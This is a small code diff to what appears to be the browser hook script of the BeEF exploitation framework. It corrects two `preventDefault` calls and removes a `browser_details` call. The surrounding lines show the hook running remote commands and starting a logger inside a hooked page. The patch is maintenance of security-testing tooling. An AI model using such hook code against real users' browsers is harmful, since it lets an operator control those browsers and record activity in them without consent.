@@ -31,7 +31,7 @@ window.onload = function () {
  */
 window.onpopstate = function (event) {
     if (beef.onpopstate.length > 0) {
-        event.preventDefault;
+        event.preventDefault();
         for (var i = 0; i < beef.onpopstate.length; i++) {
             var callback = beef.onpopstate[i];
             try {
@@ -48,7 +48,7 @@ window.onpopstate = function (event) {
  */
 window.onclose = function (event) {
     if (beef.onclose.length > 0) {
-        event.preventDefault;
+        event.preventDefault();
         for (var i = 0; i < beef.onclose.length; i++) {
             var callback = beef.onclose[i];
             try {
@@ -80,8 +80,7 @@ function beef_init() {
                 beef.updater.execute_commands();
                 beef.logger.start();
             }, parseInt(beef.websocket.ws_connect_timeout));
-        }else {
-            beef.net.browser_details();
+        } else {
             beef.updater.execute_commands();
             beef.updater.check();
             beef.logger.start();
